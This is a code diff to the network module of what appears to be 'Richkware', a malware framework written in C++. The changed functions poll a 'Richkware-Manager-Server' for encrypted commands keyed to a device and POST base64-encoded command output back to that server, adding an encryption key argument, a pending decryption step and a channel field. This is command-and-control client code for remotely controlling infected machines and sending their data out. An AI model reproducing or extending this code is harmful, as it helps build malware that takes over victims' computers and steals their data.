@@ -209,7 +209,7 @@ std::string Network::fetchCommand(/*const std::string &encryptionKey*/) {
     std::string srvAddr(serverAddress);
     std::string prt(port);
 
-    device = crypto.Encrypt(device);
+    device = crypto.Encrypt(device, defaultEncryptionKey);
 
     http::Request request(
             "http://" + srvAddr + ":" + prt + "/Richkware-Manager-Server/command?data0=" + device +
@@ -219,6 +219,7 @@ std::string Network::fetchCommand(/*const std::string &encryptionKey*/) {
 //    std::cout << parameters << std::endl;
     http::Response response = request.send("GET");
     std::string jsonResponse(response.body.begin(), response.body.end());
+
     if (jsonResponse.find("OK") != std::string::npos) {
         std::string delimiter = "\"message\":\"";
         std::string delimiter2 = "\"";
@@ -229,7 +230,9 @@ std::string Network::fetchCommand(/*const std::string &encryptionKey*/) {
 
         std::string token2;
         pos = jsonResponse.find(delimiter2);
-        return jsonResponse.substr(0, pos);
+        std::string encryptedCommands = jsonResponse.substr(0, pos);
+        std::string commands = encryptedCommands;//TODO Crypto().Decrypt(encryptedCommands);
+        return commands;
     }
     return "";
 
@@ -295,7 +298,7 @@ bool Network::uploadCommand(std::string commandsOutput/*, const std::string &enc
     //commandsOutput = crypto.Encrypt(commandsOutput);
     commandsOutput = Base64_urlencode(commandsOutput);
 
-    std::string parameters = "{device:\"" + device + "\",data:\"" + commandsOutput + "\"}";
+    std::string parameters = "{device:\"" + device + "\",data:\"" + commandsOutput + "\",channel:\"richkware\"}";
 
     http::Response response = request.send("POST", parameters, {
             "Content-Type: application/json"
